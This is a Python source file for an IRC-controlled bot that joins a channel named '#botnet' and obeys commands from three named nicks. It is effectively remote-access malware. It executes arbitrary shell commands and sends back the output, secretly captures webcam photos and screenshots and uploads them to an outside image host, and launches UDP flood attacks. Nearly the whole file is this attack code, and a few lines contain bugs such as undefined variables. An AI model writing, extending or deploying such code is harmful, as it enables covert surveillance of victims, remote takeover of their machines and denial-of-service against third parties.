# -*- coding: utf-8 -*-
import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr

from uttility import *


#-------------------------------- function ------------------------------------------
def multiLineMsg(me, target, msg):
    lines = msg.split("\n")
    final = []
    for line in lines:
        for l in line.split("\r"):
            final.append(l)         #comme ça ça decoupe dès qu'il y a du \r et \n
    for msg in final:
        me.notice(target, msg)

def cmd_output(me, target, cmd):
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = process.stdout.read().decode('utf-8', errors="ignore")+process.stderr.read().decode('cp1252')
    multiLineMsg(me, target, output)

#------------------------------------ bot -------------------------------------------

class TestBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port):
        irc.bot.SingleServerIRCBot.__init__(
            self, [(server, port)], nickname, nickname)
        self.channel = channel

    def on_nicknameinuse(self, c, e):
        me.nick(me.get_nickname() + "0x")

    def on_welcome(self, me, e):
        me.join(self.channel)

        multiLineMsg(me, "Kysan", "hi\n boi")
        print("connected")
    
    

    def on_privmsg(self, me, e):
        self.do_command(e, e.arguments[0])          #si reçois un message sur un channel publique prend le message et l'interprete 

    def on_pubmsg(self, me, e):
        self.do_command(e, e.arguments[0])          #si reçois un message sur un channel publique prend le message et l'interprete 

    def on_dccmsg(self, me, e):
        pass

    def on_dccchat(self, me, e):
        if len(me.arguments) != 2:
            return
        args = me.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def do_command(self, e, message):           #bot function
        nick = e.source.nick
        #print(nick + ": " + cmd)
        cmd = message.split(" ")
        args = cmd[1:]
        command = cmd[0]
        
        if nick == "Kysan" or nick == "Loguana" or nick == "Corps":
            me = self.connection
            me.notice(nick, "analysing...")

            if command == "disconnect":
                self.disconnect()

            elif command == "die":
                self.die()

            elif command == "cmd":
                threading.Thread(target=cmd_output, args=(me, nick, " ".join(args))).start()

            elif command == "cam":
                try:
                    file = takePicture()
                    print(file)
                    link = post_img(file)
                    me.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    me.notice(nick, "error")

            elif command == "screenshot":
                try:
                    file = screenshot()
                    print(file)
                    link = post_img(file) 
                    me.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    me.notice(nick, "error")

            elif command == "info":
                me.notice(nick, info())

            elif command == "changenick":
                me.nick(args[0])

            elif command == "help":
                me.notice(nick, "availiable commands:")
                me.notice(nick, "disconnect, cam, screenshot, info, cmd, getcwd")

            #elif args[0] == exec: a faire
            elif command == "getcwd":
                me.notice(nick, os.getcwd())

            elif command == "cd":
                print(" ". join(args))
                os.system("cd "+ " ". join(args))
                
            elif command == "flood":
                threading.Thread(target=udp_flooding, args=(args[0], args[1], c, nick)).start()
                me.notice(nick, "started")

            else:
                me.notice(nick, "Unknow command: " + message)
                me.notice(nick, "type help for commands list")

#--------------------------------- start ----------------------------

def main():
    bot = TestBot("#botnet", "kysbot", "irc.root-me.org", 6667)
    bot.start()

if __name__ == "__main__":
    main()

#made by Kysan721
